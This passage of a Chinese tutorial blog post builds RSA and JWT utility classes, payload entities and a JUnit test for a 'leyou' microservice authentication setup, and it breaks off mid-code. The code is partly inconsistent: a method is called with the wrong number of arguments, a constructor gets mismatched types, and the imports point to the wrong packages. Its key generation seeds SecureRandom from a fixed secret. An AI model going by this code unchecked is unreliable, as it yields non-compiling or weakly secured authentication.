<p>用户只需要与微服务交互，不用访问授权中心，效率大大提高！</p>
<p>接下来让我们撸起袖子，开始写代码吧！</p>
<h2 id="编写JWT工具"><a href="#编写JWT工具" class="headerlink" title="编写JWT工具"></a>编写JWT工具</h2><p>因为生成jwt，解析jwt这样的行为以后在其它微服务中也会用到，因此我们会抽取成工具，放到<code>ly-comon</code>中。 </p>
<h3 id="RSA工具类："><a href="#RSA工具类：" class="headerlink" title="RSA工具类："></a>RSA工具类：</h3><p>我们在<code>ly-common</code>中的<code>com.leyou.common.utils</code>包下创建一个工具类，方便做非对称加密。</p>
<p>RSA工具类负责对RSA密钥的创建、读取功能：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.common.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.InvalidKeySpecException;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.PKCS8EncodedKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.X509EncodedKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by ace on 2018/5/10.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> HuYi.Zhang</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RsaUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DEFAULT_KEY_SIZE</span> <span class="operator">=</span> <span class="number">2048</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 从文件中读取公钥</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> filename 公钥保存路径，相对于classpath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 公钥对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PublicKey <span class="title function_">getPublicKey</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = readFile(filename);</span><br><span class="line">        <span class="keyword">return</span> getPublicKey(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 从文件中读取密钥</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> filename 私钥保存路径，相对于classpath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 私钥对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PrivateKey <span class="title function_">getPrivateKey</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = readFile(filename);</span><br><span class="line">        <span class="keyword">return</span> getPrivateKey(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取公钥</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bytes 公钥的字节形式</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> PublicKey <span class="title function_">getPublicKey</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        bytes = Base64.getDecoder().decode(bytes);</span><br><span class="line">        <span class="type">X509EncodedKeySpec</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">X509EncodedKeySpec</span>(bytes);</span><br><span class="line">        <span class="type">KeyFactory</span> <span class="variable">factory</span> <span class="operator">=</span> KeyFactory.getInstance(<span class="string">&quot;RSA&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> factory.generatePublic(spec);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取密钥</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bytes 私钥的字节形式</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> PrivateKey <span class="title function_">getPrivateKey</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> NoSuchAlgorithmException, InvalidKeySpecException &#123;</span><br><span class="line">        bytes = Base64.getDecoder().decode(bytes);</span><br><span class="line">        <span class="type">PKCS8EncodedKeySpec</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PKCS8EncodedKeySpec</span>(bytes);</span><br><span class="line">        <span class="type">KeyFactory</span> <span class="variable">factory</span> <span class="operator">=</span> KeyFactory.getInstance(<span class="string">&quot;RSA&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> factory.generatePrivate(spec);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据密文，生存rsa公钥和私钥,并写入指定文件</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> publicKeyFilename  公钥文件路径</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> privateKeyFilename 私钥文件路径</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> secret             生成密钥的密文</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">generateKey</span><span class="params">(String publicKeyFilename, String privateKeyFilename, String secret)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">keyPairGenerator</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;RSA&quot;</span>);</span><br><span class="line">        <span class="type">SecureRandom</span> <span class="variable">secureRandom</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecureRandom</span>(secret.getBytes());</span><br><span class="line">        keyPairGenerator.initialize(DEFAULT_KEY_SIZE, secureRandom);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="comment">// 获取公钥并写出</span></span><br><span class="line">        <span class="type">byte</span>[] publicKeyBytes = keyPair.getPublic().getEncoded();</span><br><span class="line">        publicKeyBytes = Base64.getEncoder().encode(publicKeyBytes);</span><br><span class="line">        writeFile(publicKeyFilename, publicKeyBytes);</span><br><span class="line">        <span class="comment">// 获取私钥并写出</span></span><br><span class="line">        <span class="type">byte</span>[] privateKeyBytes = keyPair.getPrivate().getEncoded();</span><br><span class="line">        privateKeyBytes = Base64.getEncoder().encode(privateKeyBytes);</span><br><span class="line">        writeFile(privateKeyFilename, privateKeyBytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] readFile(String fileName) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> Files.readAllBytes(<span class="keyword">new</span> <span class="title class_">File</span>(fileName).toPath());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(String destPath, <span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(destPath);</span><br><span class="line">        <span class="keyword">if</span> (!dest.exists()) &#123;</span><br><span class="line">            dest.createNewFile();</span><br><span class="line">        &#125;</span><br><span class="line">        Files.write(dest.toPath(), bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="JWT工具类"><a href="#JWT工具类" class="headerlink" title="JWT工具类"></a>JWT工具类</h3><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><p>我们需要先在<code>ly-common</code>中引入JWT依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.10.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.10.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt-jackson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.10.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="载荷对象"><a href="#载荷对象" class="headerlink" title="载荷对象"></a>载荷对象</h4><p>JWT中，会保存载荷数据，我们计划存储3部分：</p>
<ul>
<li>id：jwt的id</li>
<li>用户信息：用户数据，不确定，可以是任意类型</li>
<li>过期时间：Date</li>
</ul>
<p>为了方便后期获取，我们定义一个类来封装。</p>
<p>在<code>ly-common</code>的<code>com.leyou.common.entity</code>包下添加一个实体类，代表载荷信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.common.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * token的唯一标示,JTI</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 过期时间</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Date expiration;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用户信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> T userInfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>jti用UUID</p>
<p>在<code>ly-common</code>的<code>com.leyou.common.utils</code>包中，添加新工具类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.common.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Claims;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jws;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.io.Decoder;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.io.Decoders;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.joda.time.DateTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.security.PrivateKey;</span><br><span class="line"><span class="keyword">import</span> java.security.PublicKey;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>  HuYi.Zhang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>  2018-05-26 15:43</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtUtils</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JWT_PAYLOAD_USER_KEY</span> <span class="operator">=</span> <span class="string">&quot;user&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 私钥加密生成token，永久有效</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> userInfo   载荷中的数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> privateKey 私钥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> JWT</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateToken</span><span class="params">(Object userInfo, PrivateKey privateKey)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">                .claim(JWT_PAYLOAD_USER_KEY, JsonUtils.toJson(userInfo))</span><br><span class="line">                .setId(createJTI())</span><br><span class="line">                .signWith(privateKey, SignatureAlgorithm.RS256)</span><br><span class="line">                .compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 私钥加密生成token，永久有效</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> userInfo   载荷中的数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> privateKey 私钥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> JWT</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateTokenWithJTI</span><span class="params">(Object userInfo, String jti, PrivateKey privateKey)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">                .claim(JWT_PAYLOAD_USER_KEY, JsonUtils.toJson(userInfo))</span><br><span class="line">                .setId(jti)</span><br><span class="line">                .signWith(privateKey, SignatureAlgorithm.RS256)</span><br><span class="line">                .compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 私钥加密生成token，指定过期时间</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> userInfo   载荷中的数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> privateKey 私钥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> expire     过期时间，单位秒</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> JWT</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateTokenExpireInSeconds</span><span class="params">(Object userInfo, PrivateKey privateKey, <span class="type">int</span> expire)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Jwts.builder()</span><br><span class="line">                .claim(JWT_PAYLOAD_USER_KEY, JsonUtils.toJson(userInfo))</span><br><span class="line">                .setId(createJTI())</span><br><span class="line">                .setExpiration(DateTime.now().plusSeconds(expire).toDate())</span><br><span class="line">                .signWith(privateKey, SignatureAlgorithm.RS256)</span><br><span class="line">                .compact();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 公钥解析token</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> token     用户请求中的token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> publicKey 公钥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Jws&lt;Claims&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Jws&lt;Claims&gt; <span class="title function_">parserToken</span><span class="params">(String token, PublicKey publicKey)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Jwts.parser().setSigningKey(publicKey).parseClaimsJws(token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">createJTI</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(UUID.randomUUID().toString().getBytes()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取token中的用户信息，并且验证token是否有效、是否过期</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> token     用户请求中的令牌</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> publicKey 公钥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> userType 载荷中的用户数据的类型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 用户信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; Payload&lt;T&gt; <span class="title function_">getInfoFromToken</span><span class="params">(String token, PublicKey publicKey, Class&lt;T&gt; userType)</span> &#123;</span><br><span class="line">        Jws&lt;Claims&gt; claimsJws = parserToken(token, publicKey);</span><br><span class="line">        <span class="type">Claims</span> <span class="variable">body</span> <span class="operator">=</span> claimsJws.getBody();</span><br><span class="line">        Payload&lt;T&gt; claims = <span class="keyword">new</span> <span class="title class_">Payload</span>&lt;&gt;();</span><br><span class="line">        claims.setId(body.getId());</span><br><span class="line">        <span class="keyword">if</span>(userType == String.class)&#123;</span><br><span class="line">            claims.setUserInfo((T) body.get(JWT_PAYLOAD_USER_KEY).toString());</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            claims.setUserInfo(JsonUtils.toBean(body.get(JWT_PAYLOAD_USER_KEY).toString(), userType));</span><br><span class="line">        &#125;</span><br><span class="line">        claims.setExpiration(body.getExpiration());</span><br><span class="line">        <span class="keyword">return</span> claims;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取token中的ID信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> token     用户请求中的令牌</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> publicKey 公钥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 用户信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getIdFromToken</span><span class="params">(String token, PublicKey publicKey)</span> &#123;</span><br><span class="line">        Jws&lt;Claims&gt; claimsJws = parserToken(token, publicKey);</span><br><span class="line">        <span class="keyword">return</span> claimsJws.getBody().getId();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Decoder&lt;String, <span class="type">byte</span>[]&gt; stringDecoder = Decoders.BASE64URL;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取token中的载荷信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> token     用户请求中的令牌</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 用户信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; Payload&lt;T&gt; <span class="title function_">getInfoFromToken</span><span class="params">(String token, Class&lt;T&gt; userType)</span> <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payloadStr</span> <span class="operator">=</span> StringUtils.substringBetween(token, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = stringDecoder.decode(payloadStr);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        Map&lt;String, String&gt; map = JsonUtils.toMap(json, String.class, String.class);</span><br><span class="line">        Payload&lt;T&gt; claims = <span class="keyword">new</span> <span class="title class_">Payload</span>&lt;&gt;();</span><br><span class="line">        claims.setId(map.get(<span class="string">&quot;jti&quot;</span>));</span><br><span class="line">        claims.setExpiration(<span class="keyword">new</span> <span class="title class_">Date</span>(Long.valueOf(map.getOrDefault(<span class="string">&quot;exp&quot;</span>, <span class="string">&quot;0&quot;</span>))));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(userType == String.class)&#123;</span><br><span class="line">            claims.setUserInfo((T) map.get(<span class="string">&quot;user&quot;</span>));</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            claims.setUserInfo(JsonUtils.toBean(map.get(<span class="string">&quot;user&quot;</span>), userType));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> claims;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><h4 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h4><p>这里我们假设用户信息包含3部分：</p>
<ul>
<li>id：用户id</li>
<li>username：用户名</li>
<li>role：角色（权限中会使用）</li>
</ul>
<p>载荷:UserInfo</p>
<p>在<code>ly-common</code>的<code>com.leyou.common.entity</code>包下添加一个实体类，代表用户信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.common.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInfo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; role;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInfo</span><span class="params">(Long id, String username)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInfo</span><span class="params">(Long id, String username, List&lt;String&gt; role)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.role = role;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="测试类"><a href="#测试类" class="headerlink" title="测试类"></a>测试类</h4><p>我们在<code>ly-common</code>中编写测试类：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022676.png" alt="1554612391707"> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.common;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.auth.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.auth.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.auth.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.auth.utils.RsaUtils;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.PrivateKey;</span><br><span class="line"><span class="keyword">import</span> java.security.PublicKey;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AuthTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">privateFilePath</span> <span class="operator">=</span> <span class="string">&quot;C:\\develop\\ssh\\id_rsa&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">publicFilePath</span> <span class="operator">=</span> <span class="string">&quot;C:\\develop\\ssh\\id_rsa.pub&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testRSA</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 生成密钥对</span></span><br><span class="line">        RsaUtils.generateKey(publicFilePath, privateFilePath, <span class="string">&quot;hello&quot;</span>, <span class="number">2048</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取私钥</span></span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> RsaUtils.getPrivateKey(privateFilePath);</span><br><span class="line">        System.out.println(<span class="string">&quot;privateKey = &quot;</span> + privateKey);</span><br><span class="line">        <span class="comment">// 获取公钥</span></span><br><span class="line">        <span class="type">PublicKey</span> <span class="variable">publicKey</span> <span class="operator">=</span> RsaUtils.getPublicKey(publicFilePath);</span><br><span class="line">        System.out.println(<span class="string">&quot;publicKey = &quot;</span> + publicKey);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testJWT</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 获取私钥</span></span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> RsaUtils.getPrivateKey(privateFilePath);</span><br><span class="line">        <span class="comment">// 生成token</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> JwtUtils.generateTokenExpireInSeconds(<span class="keyword">new</span> <span class="title class_">UserInfo</span>(<span class="number">1L</span>, <span class="string">&quot;Jack&quot;</span>, <span class="string">&quot;guest&quot;</span>), privateKey, <span class="number">5</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;token = &quot;</span> + token);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取公钥</span></span><br><span class="line">        <span class="type">PublicKey</span> <span class="variable">publicKey</span> <span 